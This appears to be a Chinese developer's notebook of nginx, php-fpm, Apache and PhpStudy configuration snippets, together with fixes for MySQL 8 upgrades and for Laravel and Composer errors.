    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #include common.conf;
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
}

; yum源配置(7020_yum.conf)
server {
    listen       7020;
    server_name_in_redirect  off;
    charset utf-8;
    access_log  www.access.log  main;
    error_log  logs/www.error.log;
    set  $wwwroot /home/data/installfile/base;
    root $wwwroot;
    index index.html index.htm index.php;
    location / {
        root /home/data/installfile/base;
        index index.html index.html;
        autoindex on;
        autoindex_exact_size off;
        autoindex_localtime on;
    }
    #error_page  404              /404.html;
    # redirect server error pages to the static page /50x.html
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
            root   html;
    }
    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    location ~ \.php?.*$ {
        root           $wwwroot;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        fastcgi_connect_timeout 240;
        fastcgi_send_timeout 240;
        fastcgi_read_timeout 240;
        fastcgi_buffer_size 64k;
        fastcgi_buffers 4 64k;
        fastcgi_busy_buffers_size 128k;
        fastcgi_temp_file_write_size 128k;
        include        fastcgi_params;
    }
    location ~* \.(gif|jpg|jpeg|png|bmp|swf|otf|svg|eot|ttf|woff)$
    {
        root                  $wwwroot;
        expires               30d;
    }
    location ~* \.(js|css)?$
    {
        root                  $wwwroot;
        expires               1d;
    }
    #include common.conf;
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    location ~ /\.ht {
        deny  all;
    }
}

; 本地nginx默认配置(7021_nginx.conf)
server {
    listen       7201;
    server_name_in_redirect  off;
    charset utf-8;
    access_log  www.access.log   main;
    error_log  logs/www.error.log;
    set $wwwroot /usr/local/nginx/html;
    root $wwwroot;
    index index.html index.htm index.php;
    #error_page  404              /404.html;
    location ~* ^/attachments/.*.(php|php5)$ {
        deny all;
    }
    location / {
    root $wwwroot;
        #   try_files  $uri /index.php?$args;
        #index index.php index.html index.htm;
        #站点的rewrite在这里写
        #rewrite ^/(\w+)\.html$ /$1.php;
        #rewrite ^/(\w+)/(\w+)$ /$1/$2.php;
    }
    # redirect server error pages to the static page /50x.html
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
            root   html;
    }
    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    location ~ \.php?.*$ {
        root           $wwwroot;
        #fastcgi_pass unix:/tmp/php-cgi.sock
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        fastcgi_connect_timeout 240;
        fastcgi_send_timeout 240;
        fastcgi_read_timeout 240;
        fastcgi_buffer_size 64k;
        fastcgi_buffers 4 64k;
        fastcgi_busy_buffers_size 128k;
        fastcgi_temp_file_write_size 128k;
        include        fastcgi_params;
    }
    location ~* \.(gif|jpg|jpeg|png|bmp|swf|otf|svg|eot|ttf|woff)$
    {
        root                  $wwwroot;
        expires               30d;
    }
    location ~* \.(js|css)?$
    {
        root                  $wwwroot;
        expires               1d;
    }
    #include common.conf;
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    location ~ /\.ht {
        deny  all;
    }
}

; nginx的https的80配置(80_www.conf)
server {
    listen       80;
    server_name baidu.com;
    rewrite ^(.*)$ https://${server_name}$1 permanent;
}

; nginx的https的443配置(443_www.conf)
server {
    listen       443 ssl;
    charset utf-8;
    access_log  www.access.log  main;
    error_log  logs/www.error.log;
    #set $wwwroot /home/data/update;
    set $wwwroot  /usr/local/nginx/html;
    root $wwwroot;
    index index.html index.htm index.php;
    server_name baidu.com;
    #error_page  404              /404.html;
    ssl_certificate   3923894_baidu.com.pem;
    ssl_certificate_key  3923894_baidu.com.key;
    ssl_session_timeout 5m;
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers on;
    location / {
        client_max_body_size 1000M;
        proxy_pass http://127.0.0.1:7090;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarder-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_buffer_size 1000k;
        proxy_buffers 24 1000k;
        proxy_busy_buffers_size 1000k;  
        proxy_connect_timeout   300; 
        proxy_send_timeout      300; 
        proxy_read_timeout      300;    
    }
    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
            root   html;
    }
    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #include common.conf;
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    location ~ /\.ht {
        deny  all;
    }
}

; nginx.conf
http {
    include mime.types;
    server_names_hash_bucket_size 512;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65;
    tcp_nodelay on;
    client_header_timeout 15;
    client_body_timeout 15;
    send_timeout 25;
    include vhosts/*.conf;
}

; keepalive_timeout 60s;
该参数用于设置客户端连接保持会话的超时时间，超过这个时间服务器会关闭该连接

; client_body_timeout 20s;
该参数用于设置读取客户端请求主体数据的超时时间，如果超时客户端还没有发送完整的主体数据。 
服务器将返回 "Request time out (408)" 错误

; client_header_timeout 10s;
该参数用于设置读取客户端请求头数据的超时时间，如果超时客户端还没有发送完整的 header 数据。 
服务器将返回 "Request time out (408)" 错误

; send_timeout 30s;
用于指定响应客户端的超时时间，如果超过这个时间，客户端没有任何活动，Nginx 将会关闭连接
根据转发的应用服务可以配置 proxy_send_timeout、uwsgi_send_timeout、fastcgi_send_timeout

; lingering_timeout 5s;
可以理解为 TCP 连接关闭时的 SO_LINGER 延时设置，默认 5s
当lingering_close有效时，此伪指令指定更多客户端数据到达的最大等待时间。 如果在此期间未收到数据
连接已关闭。 否则，将读取并忽略数据，并且nginx开始再次等待更多数据。
重复“ wait-read-ignore”周期，但不超过lingering_time指令指定的周期。

; tcp_nodelay 
默认情况下当数据发送时，内核并不会马上发送，可能会等待更多的字节组成一个数据包，这样可以提高 I/O 性能。
但是，在每次只发送很少字节的业务场景中，使用 tcp_nodelay 功能，等待时间会比较长
 
; resolver_timeout 30s;
域名解析超时，默认 30s

; proxy_connect_timeout 60s;
定义用于与代理服务器建立连接的超时。 请注意，此超时通常不能超过75秒。

; proxy_read_timeout 60s;
定义用于从代理服务器读取响应的超时。 仅在两个连续的读取操作之间设置超时，
而不是整个响应的传递。 如果代理服务器在此时间内未传输任何内容，则连接将关闭。

; proxy_send_timeout 60s;
设置用于将请求传输到代理服务器的超时。 仅在两个连续的写操作之间设置超时，
不用于传输整个请求。 如果代理服务器无法记录

```

## Nginx命令
```
-- 查看nginx是否启动
ps -A | grep nginx  
-- 检查语法
application/nginx/sbin/nginx -t 
-- 平滑加载配置文件(建议使用这个)
application/nginx/sibn/nginx -s reload 
-- 启动nginx服务 
application/nginx/sbin/nginx 
```

## Nginx报错
```
; nginx: [alert] kill(1668, 1) failed (3: No such process)
没有启动nginx服务，执行/app/nginx/sbin/nginx，开启nginx服务后解决

; 上传文件nginx报错
上传接口直接显示ngnix报错
日志显示：缺失某个文件夹
将文件夹创建即可
```

## Base64编码为什么会使数据量变大？
```
Base64编码的思想是是采用64个基本的ASCII码字符对数据进行重新编码。
它将需要编码的数据拆分成字节数组。
以3个字节为一组。按顺序排列24位数据，再把这24位数据分成4组，即每组6位。
再在每组的的最高位前补两个0凑足一个字节。
这样就把一个3字节为一组的数据重新编码成了4个字节。
当所要编码的数据的字节数不是3的整倍数，也就是说在分组时最后一组不够3个字节。
这时在最后一组填充1到2个0字节。并在最后编码完成后在结尾添加1到2个"="。
（ 注BASE64字符表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/）

从以上编码规则可以得知，通过Base64编码，原来的3个字节编码后将成为4个字节，
即字节增加了33.3%，数据量相应变大。所以20M的数据通过Base64编码后大小大概为20M*133.3%=26.67M。
```

## png转jpg(将png转为jpg后图片大小将减少一位数)
```
    // png转jpg
    public function PngChangeJpg($src_path)
    {
		$src_path = '.'.$src_path;
        // 图片不存在不做处理
        if(!file_exists($src_path)){
            return $src_path;
        }
        $info = getimagesize($src_path);
		$src_original_width = $info[0];
		$src_original_height = $info[1];
		$mime = $info['mime'];
        $type = substr(strrchr($mime, '/'), 1);
        $baseImgPath = str_replace($type,'',$src_path);
        // 图片不是png不做处理
        if($type!='png'){
            return $src_path;
        }
		$res = imagecreatefrompng($src_path);
		$new_path = $baseImgPath.'jpg';
        $res = imagejpeg($res, $new_path);
        if ($res) {
			return $new_path;
        } else {
			return $src_path;
        }
    } 
```

## PhpStudy升级到mysql8
```
下载
下载安装包mysql8.0,如果你想要下载其它版本可以选择：mysql历史版本地址。

将phpstudy的mysql目录重命名为Mysqlbak。

然后把下载好的新版本的mysql解压到这个目录里。我的是F:\phpStudy\MySQL

编辑my.ini文件
下载的mysql8默认是没有my.ini的，
复制原来的(Mysqlbak目录下的)一份my.ini到mysql目录下
注意Mysql8的新特性和配置，原来的my.ini是不能直接用的。需要改下
比如修改后我的my.ini

[mysql]
设置mysql客户端默认字符集
default-character-set=utf8mb4
 
[mysqld]
设置3306端口
port =3306
设置mysql的安装目录
basedir="F:\phpStudy\MySQL\"
#存放数据的目录
datadir="F:\phpStudy\MySQL\data"
允许最大连接数
max_connections=20
服务端使用的字符集默认为8比特编码的latin1字符集
character-set-server=utf8mb4
collation-server = utf8mb4_unicode_ci
创建新表时将使用的默认存储引擎
default-storage-engine=INNODB
#认证方式(如果这里不修改，会新版的密码认证，会连接不了数据库的，并且要放到mysqld下)
default_authentication_plugin = mysql_native_password

启动
接下来我们来启动下 MySQL 数据库：

以管理员身份打开 cmd 命令行工具（可以到C盘system32下的cmd.exe右键管理员运行），切换目录：

我的是在F盘，先转到F盘先，然后再初始化MYSQL
C:\Users\Administrator>F:

F:\>cd F:\phpStudy\MySQL\bin

F:\phpStudy\MySQL\bin>mysqld --initialize --console

如果安装成功后，会出现mysql密码了比如上面我的是：+HVW8Qi(RT/d

然后继续安装
mysqld install

启动服务器
net start mysql

phpStudy自带的mysql是5.5版本的，无法启动 mysql了 这是为什么？？？ 

原因是phpStudy为我们注册了一个MySQL服务
而我们用mysql -install命令安装Mysql的时候注册 了一个MySQL所以问题来了，两者冲突了。
解决办法 很简单，打开CMD命令输入 sc delete MySQL 　

启动成功后，输入密码登录

注意：
因为mysql8.0的密码加密方式跟之前的保存方式不一样，所以要转码，Navicat 或 phpstudy才能连接得

更改密码：
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '这里输入你的密码自行修改';

到此mysql8更新成功，接下来测试下phpstudy启动服务试下：
先停掉Mysql服务：net stop mysql

切换到phpstydy客户度界面，我重启服务看下 OK
```
 
## PhpStudy2018 升级mysql版本，解决启动问题
```
点击phpStudy->其他选项菜单->服务管理器->MySQL->安装服务，
点击phpStudy->其他选项菜单->服务管理器->打开服务管理->MySQL->安装服务

应该有个MySQL和MySQLa，mysqla既然是phpstudy帮你注册的服务
那你自己mysqld -install的注册的服务是mysql。
执行sc delete mysql,再启动phpstudy就好了。
假如phpstudy安装失败的话，记得要把执行sc delete mysql。
skip-grant-tables，这个是跳过验证的，自己设置密码吧。
```

## php-fpm配置文件详解
```
第一部分：FPM 配置
-p　: 命令行中动态修改--prefix 　

;include=etc/fpm.d/*.conf　　
;用于包含一个或多个文件，如果glob(3)存在(glob()函数返回匹配指定模式的文件名或目录)

第二部分：全局配置
由标志[global]开始：
;pid = run/php-fpm.pid　　　　　   
;设置pid文件的位置，默认目录路径 /usr/local/php/var
;error_log = log/php-fpm.log　　  
;记录错误日志的文件，默认目录路径 /usr/local/php/var
;syslog.facility = daemon　　　　  
;用于指定什么类型的程序日志消息。
;syslog.ident = php-fpm　　　　    
;用于FPM多实例甄别
;log_level = notice　　　　　　　   
;记录日志的等级，默认notice，可取值alert, error, warning, notice, debug
;emergency_restart_threshold = 0  
;如果子进程在这个时间段内带有IGSEGV或SIGBUS退出，则重启fpm，默认0表示关闭这个功能
;emergency_restart_interval = 0　 
;设置时间间隔来决定服务的初始化时间（默认单位：s秒），可选s秒，m分，h时，d天
;process_control_timeout = 0　　  
;子进程等待master进程对信号的回应（默认单位：s秒），可选s秒，m分，h时，d天
;process.max = 128　　　　　　　　  
;控制最大进程数，使用时需谨慎
;process.priority = -19　　　　　  
;处理nice(2)的进程优先级别-19(最高)到20(最低)
;rlimit_files = 1024　　　　　　　　
;设置主进程文件描述符rlimit的数量
;rlimit_core = 0　　　　　　　　　　 
;设置主进程rlimit最大核数
;events.mechanism = epoll　　　　　
;使用处理event事件的机制
　　; - select     (any POSIX os)
　　; - poll       (any POSIX os)
　　; - epoll      (linux >= 2.5.44)
　　; - kqueue     (FreeBSD >= 4.1, OpenBSD >= 2.9, NetBSD >= 2.0)
　　; - /dev/poll  (Solaris >= 7)
　　; - port       (Solaris >= 10)
;daemonize = yes　　　　　　　　　　 
;将fpm转至后台运行，如果设置为"no"，那么fpm会运行在前台
;systemd_interval = 10

第三部分：进程池的定义
通过监听不同的端口和不用管理选择可以定义多个不同的子进程池。
进程池被用于记录和统计，对于fpm能够处理进程池数目的多少并没有限制
其中$pool变量可以在任何指令中使用，他将会替代相应的进程池名字。例如：这里的[www]

[root@test ～]# ps -ef | grep php-fpm
root      3028     1  0 20:33 ?        00:00:00 php-fpm: master process (/usr/local/php/etc/php-fpm.conf)
nobody    3029  3028  0 20:33 ?        00:00:00 php-fpm: pool www          
nobody    3030  3028  0 20:33 ?        00:00:00 php-fpm: pool www

[www]
; It only applies on the following directives:
; - 'access.log'
; - 'slowlog'
; - 'listen' (unixsocket)
; - 'chroot'
; - 'chdir'
; - 'php_values'
; - 'php_admin_values'

;prefix = /path/to/pools/$pool    
;如果没有制定，将使用全局prefix替代
user = nobody　　　　　　　　　　　　 
;进程的发起用户和用户组，用户user是必须设置，group不是
group = nobody
listen = 127.0.0.1:9000　　　　　　 
;监听ip和端口
;listen.backlog = 65535　　　　　　 
;设置listen(2)函数backlog
;listen.owner = nobody
;listen.group = nobody
;listen.mode = 0660
;listen.acl_users =
;listen.acl_groups =
;listen.allowed_clients = 127.0.0.1 
;允许FastCGI客户端连接的IPv4地址，多个地址用','分隔，为空则允许任何地址发来链接请求
; process.priority = -19
pm = dynamic　　　　　　　　　　　　　  
;选择进程池管理器如何控制子进程的数量
　　   static：　　                   
;对于子进程的开启数路给定一个锁定的值(pm.max_children)
　　   dynamic:　                    
;子进程的数目为动态的，它的数目基于下面的指令的值(以下为dynamic适用参数)
　　　　pm.max_children：            
;同一时刻能够存活的最大子进程的数量
　　　　pm.start_servers：           
;在启动时启动的子进程数量
　　　　pm.min_spare_servers：       
;处于空闲"idle"状态的最小子进程，如果空闲进程数量小于这个值，那么相应的子进程会被创建
　　　　pm.max_spare_servers：       
;最大空闲子进程数量，空闲子进程数量超过这个值，那么相应的子进程会被杀掉。
　　ondemand：                       
;在启动时不会创建，只有当发起请求链接时才会创建(pm.max_children, pm.process_idle_timeout)

pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
;pm.process_idle_timeout = 10s;　　
;空闲进程超时时间
;pm.max_requests = 500　　　　　　　 
;在派生新的子进程前，每一个子进程应该处理的请求数目，在第三方库中解决内存溢出很有用，设置为0则不会限制
;pm.status_path = /status　　　     
;配置一个URI，以便查看fpm状态页

状态页描述：
　　accepted conn:                 
;该进程池接受的请求数量
　　pool:                          
;进程池的名字
　　process manager:               
;进程管理，就是配置中pm指令，可以选择值static，dynamic，ondemand
　　idle processes:                
;空闲进程数量
　　active processes:              
;当前活跃的进程数量
　　total processes:               
;总的进程数量=idle+active
　　max children reached:          
;达到最大子进程的次数，达到进程的限制，当pm试图开启更多的子进程的时候(仅当pm工作在dynamic时)
;ping.path = /ping　　　　          
;该ping URI将会去调用fpm监控页面，如果这个没有设置，那么不会有URI被做为ping页
;ping.response = pong　　          
;用于定制平请求的响应，响应的格式text/plain(对200响应代码)
;access.log = log/$pool.access.log
;access.format = "%R - %u %t \"%m %r%Q%q\" %s %f %{mili}d %{kilo}M %C%%"
　　; The following syntax is allowed
　　;  %%: the '%' character
　　;  %C: %CPU used by the request
　　;      it can accept the following format:
　　;      - %{user}C for user CPU only
　　;      - %{system}C for system CPU only
　　;      - %{total}C  for user + system CPU (default)
　　;  %d: time taken to serve the request
　　;      it can accept the following format:
　　;      - %{seconds}d (default)
　　;      - %{miliseconds}d
　　;      - %{mili}d
　　;      - %{microseconds}d
　　;      - %{micro}d
　　;  %e: an environment variable (same as $_ENV or $_SERVER)
　　;      it must be associated with embraces to specify the name of the env
　　;      variable. Some exemples:
　　;      - server specifics like: %{REQUEST_METHOD}e or %{SERVER_PROTOCOL}e
　　;      - HTTP headers like: %{HTTP_HOST}e or %{HTTP_USER_AGENT}e
　　;  %f: script filename
　　;  %l: content-length of the request (for POST request only)
　　;  %m: request method
　　;  %M: peak of memory allocated by PHP
　　;      it can accept the following format:
　　;      - %{bytes}M (default)
　　;      - %{kilobytes}M
　　;      - %{kilo}M
　　;      - %{megabytes}M
　　;      - %{mega}M
　　;  %n: pool name
　　;  %o: output header
　　;      it must be associated with embraces to specify the name of the header:
　　;      - %{Content-Type}o
　　;      - %{X-Powered-By}o
　　;      - %{Transfert-Encoding}o
　　;      - ....
　　;  %p: PID of the child that serviced the request
　　;  %P: PID of the parent of the child that serviced the request
　　;  %q: the query string
　　;  %Q: the '?' character if query string exists
　　;  %r: the request URI (without the query string, see %q and %Q)
　　;  %R: remote IP address
　　;  %s: status (response code)
　　;  %t: server time the request was received
　　;      it can accept a strftime(3) format:
　　;      %d/%b/%Y:%H:%M:%S %z (default)
　　;  %T: time the log has been written (the request has finished)
　　;      it can accept a strftime(3) format:
　　;      %d/%b/%Y:%H:%M:%S %z (default)
　　;  %u: remote user
;slowlog = log/$pool.log.slow　　 
;用于记录慢请求
;request_slowlog_timeout = 0　　  
;慢日志请求超时时间，对一个php程序进行跟踪。
;request_terminate_timeout = 0　　
;终止请求超时时间，在worker进程被杀掉之后，提供单个请求的超时间隔。
由于某种原因不停止脚本执行时，应该使用该选项，0表示关闭不启用
(在php.ini中，max_execution_time 一般设置为30，表示每一个脚本的最大执行时间)
;rlimit_files = 1024　　　　　　　　
;设置打开文件描述符的限制
;rlimit_core = 0　　　　　　　　　　 
;设置内核对资源的使用限制，用于内核转储
;chroot =　　　　　　　　　　　　　　　
;设置chroot路径，程序一启动就将其chroot放置到指定的目录下，该指令值必须是一个绝对路径
;chdir = /var/www　　　　　　　　　　
;在程序启动时将会改变到指定的位置(这个是相对路径，相对当前路径或chroot后的“/”目录)　　　　
;catch_workers_output = yes　　　　
;将worker的标准输出和错误输出重定向到主要的错误日志记录中。
如果没有设置，根据FastCGI的指定，将会被重定向到/dev/null上
;clear_env = no　　　　　　　　　　  
;清理环境
;security.limit_extensions = .php .php3 .php4 .php5　　
;限制FPM执行解析的扩展名
;env[HOSTNAME] = $HOSTNAME
;env[PATH] = /usr/local/bin:/usr/bin:/bin
;env[TMP] = /tmp
;env[TMPDIR] = /tmp
;env[TEMP] = /tmp

; Additional php.ini defines, specific to this pool of workers. These settings
; overwrite the values previously defined in the php.ini. The directives are the
; same as the PHP SAPI:
;   php_value/php_flag             - you can set classic ini defines which can
;                                    be overwritten from PHP call 'ini_set'.
;   php_admin_value/php_admin_flag - these directives won't be overwritten by
;                                     PHP call 'ini_set'
; For php_*flag, valid values are on, off, 1, 0, true, false, yes or no.

; Defining 'extension' will load the corresponding shared extension from
; extension_dir. Defining 'disable_functions' or 'disable_classes' will not
; overwrite previously defined php.ini values, but will append the new value
; instead.

;php_admin_value[sendmail_path] = /usr/sbin/sendmail -t -i -f www@my.domain.com
;php_flag[display_errors] = off
;php_admin_value[error_log] = /var/log/fpm-php.www.log
;php_admin_flag[log_errors] = on
;php_admin_value[memory_limit] = 32M

总结：
在php-fpm的配置文件中，有两个指令非常重要，就是"pm.max_children" 和 "request_terminate_timeout"

"pm.max_children" 确定了php-fpm的处理能力。
原则上时越多越好，但这个是在内存足够打的前提下，每开启一个php-fpm进程要占用近30M左右的内存

如果请求访问较多，那么可能会出现502，504错误。
对于502错误来说，属于繁忙进程而造成的。
对于504来说，就是客户发送的请求在限定的时间内没有得到相应。
过多的请求导致“504  Gateway  Time-out”。这里也有可能是服务器带宽问题。

另外一个需要注意的指令"request_terminate_timeout"，它决定php-fpm进程的连接/发送和读取的时间。
如果设置过小很容易出现"502 Bad Gateway" 和 “504  Gateway  Time-out”。
默认为0，就是说没有启用，不加限制，但是这种设置前提是你的php-fpm足够健康，这个需要根据实际情况加以限定。
```

## apache服务超时处理phpstudy+apache+php
```
问题现象
有时再用xdebug调试程序时,由于调试时间过长会出现500服务器错误的现象。
根本原因在于apache默认的连接时间过短导致。

适用于
中间件:Apache(Fastcgi)
错误日志为:End of script output before headers

解决方法
打开apache配置文件注释掉如下，并添加一行。

    # Various default settings
    Include conf/extra/httpd-default.conf 将注释去掉
    Include conf/extra/httpd-fcgid.conf 添加此行

更改httpd-default.conf如下内容

    # Timeout: The number of seconds before receives and sends time out.
    #
    Timeout 3600
    
    #
    # KeepAlive: Whether or not to allow persistent connections (more than
    # one request per connection). Set to "Off" to deactivate.
    #
    KeepAlive On
    
    #
    # MaxKeepAliveRequests: The maximum number of requests to allow
    # during a persistent connection. Set to 0 to allow an unlimited amount.
    # We recommend you leave this number high, for maximum performance.
    #
    MaxKeepAliveRequests 0
    
    #
    # KeepAliveTimeout: Number of seconds to wait for the next request from the
    # same client on the same connection.
    #
    KeepAliveTimeout 3600

更改php.ini如下内容

    max_execution_time = 3600
    ; Maximum amount of time each script may spend parsing request data. It's a good
    ; idea to limit this time on productions servers in order to eliminate unexpectedly
    ; long running scripts.

在extra目录下创建httpd-fcgid.conf，写入如下内容。

    ProcessLifeTime 3600
    FcgidIOTimeout 3600
    FcgidConnectTimeout 3600
    FcgidOutputBufferSize 128
    FcgidMaxRequestsPerProcess 1000
    FcgidMinProcessesPerClass 0 
    FcgidMaxProcesses 16 
    FcgidMaxRequestLen 268435456   
    FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000
    IPCConnectTimeout 3600
    IPCCommTimeout 3600
    FcgidIdleTimeout 3600
    FcgidBusyTimeout 60000
    FcgidBusyScanInterval 120
    FcgidInitialEnv PHPRC "D:\Software\phpstudy_pro\Extensions\php\php5.5.9nts" 
    此处填写正在使用的php路径
    AddHandler fcgid-script .php

搞定
```

## PhpStudy的php项目在nginx环境下404、403错误
```
在vhost-ini文件上配置下面
location / {
    if (!-e $request_filename) {
     rewrite ^(.*)$ /index.php?s=/$1 last;
     break;
    }
}

完整如下:
server {
        listen       80;
        server_name  house.xxx.com ;
        root   "E:\code\www\html\web\xxx\public";
	    location / {
          if (!-e $request_filename) {
             rewrite ^(.*)$ /index.php?s=/$1 last;
             break;
          }
        }
        location ~ \.php(.*)$ {
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            fastcgi_param  PATH_INFO  $fastcgi_path_info;
            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;
            include        fastcgi_params;
        }
}
当访问该网站的时，nginx 会按照 index.html，index.htm ，index.php 的先后顺序在根目录中查找文件。
如果这三个文件都不存在，那么nginx就会返回403 Forbidden。
所以，在vhost里没有这段内容直接输入域名访问就会报403的错误。
除非你在域名后面加个 /index.php才可以正常访问;
```

## PhpStudy:首次访问提示forbidden 403错误的处理
```
设置一下：phpstudy设置->允许目录列表，然后就OK了
```

## PhpStudy 500 Internal Server Error 解决办法
```
版本：phpstudy 2018

报错：500 Internal Server Error

原因：手动选择路径的时候，产生了斜杠不同  
正确：("D:/phpStudy/PHPTutorial/WWW/thinkphp50/public")  
错误（“D:\phpStudy\PHPTutorial\WWW\composer\tp51\public”）

解决办法：找到nginx的配置文件，改正路径就行
// 错误    \
root   "D:\phpStudy\PHPTutorial\WWW\composer\tp51\public";  // phpstudy 留下的一个小bug
// 正确   /
root   "D:/phpStudy/PHPTutorial/WWW/thinkphp50/public";
```

## 字符串类型时间前移一个小时
```
$one_hour_ago=(new DateTime('2017-04-20 11:46:00'))->modify('-1 hour')->format("Y-m-d H:i:s");
echo $one_hour_ago;
```

## PhpStudy添加redis扩展
```
查看php版本 我的是5.6

查看phpinfo 没有redis

下载对应版本的扩展文件
http://windows.php.net/downloads/pecl/releases/redis/2.2.7/php_redis-2.2.7-5.6-nts-vc11-x86.zip
http://windows.php.net/downloads/pecl/releases/igbinary/1.2.1/php_igbinary-1.2.1-5.5-nts-vc11-x86.zip

拷贝php_igbinary.dll，php_igbinary.pdb，php_redis.dll，php_redis.pdb到php-5.6.27-nts\ext

修改php.ini
extension=php_igbinary.dll
extension=php_redis.dll

注意：php_igbinary.dll 在前
;extension=php_snmp.dll  放这个前面

在phpstudy中重启服务，查看phpinfo即可
```

## get_headers
```
get_headers — 取得服务器响应一个 HTTP 请求所发送的所有标头

说明
get_headers ( string $url [, int $format = 0 ] ) : array
get_headers() 返回一个数组，包含有服务器响应一个 HTTP 请求所发送的标头。

参数
url
目标 URL。

format
如果将可选的 format 参数设为 1，则 get_headers() 会解析相应的信息并设定数组的键名。

返回值
返回包含有服务器响应一个 HTTP 请求所发送标头的索引或关联数组，如果失败则返回 FALSE。
```

## 打印文件日志
```
file_put_contents("./log/OutUrlChangeInUrl.log", print_r($baseUrl,true).PHP_EOL, FILE_APPEND);
```

## laravel 500 Server Error，完美解决
```
打开配置文件 laravel/config/app.php

找到 'debug'项 设置为 true

刷新网页 抛出运行异常：No application encryption key has been specified.(未指定应用加密密钥)

在laravel下找到 .env.example，将其复制一份重命名为 ".env"

在laravel下执行命令：php artisan key:generate，后刷新页面
```

## 解决composer install遇到：Your requirements could not be resolved to an installable set of packages
```
解决办法：直接忽略版本就是了
composer install --ignore-platform-reqs 或者 composer update --ignore-platform-reqs
```

## laravel 代码报错 Warning: require(D:\WWW\laravel\bootstrap/../vendor/autoload.php
```
删除 composer.lock 文件，重新执行 composer install

php版本不匹配，接着 composer install --ignore-platform-reqs     忽略版本匹配
```

## 源码安装禅道诡异的的 no input file specified
```
确实没有input.php文件，将input.php.tmp 改为input.php即可
```